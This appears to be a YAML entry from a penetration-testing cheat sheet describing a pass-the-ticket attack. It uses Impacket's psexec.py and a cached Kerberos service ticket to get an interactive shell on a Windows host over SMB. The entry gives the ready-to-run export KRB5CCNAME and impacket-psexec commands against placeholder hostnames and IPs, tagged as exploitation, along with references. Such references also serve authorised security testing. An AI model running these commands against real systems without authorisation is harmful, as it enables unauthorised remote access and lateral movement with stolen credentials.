---
description: |
  Impacket's psexec.py offers psexec like functionality. This will give you an interactive shell on the Windows host. psexec.py also allows using Service Tickets, saved as a ccache file for Authentication. It can be obtained via Impacket's GetST.py. Important to mention is that Kerberos prefers hostnames instead of IP's, therefore specify -target-ip.

  Command Reference:

    Target hostname: backup01.test.local

  	Target IP: 10.10.10.1

    Domain controller: 10.10.10.111

  	Domain: test.local

  	Username: john (his ticket is in cache)

command: |
  impacket-psexec -k -no-pass -target-ip 10.10.10.1 -dc-ip 10.10.10.111 backup01.test.local

code: |
  export KRB5CCNAME=/full/path/to/john.ccache; 

items:
  - TGS
  - Username
services:
  - SMB
OS:
  - Linux
  - Windows
attack_types:
  - Exploitation
references:
  - https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py
  - https://www.sans.org/blog/psexec-python-rocks/
  - https://book.hacktricks.xyz/windows/active-directory-methodology/pass-the-ticket#pass-the-ticket-attack
---
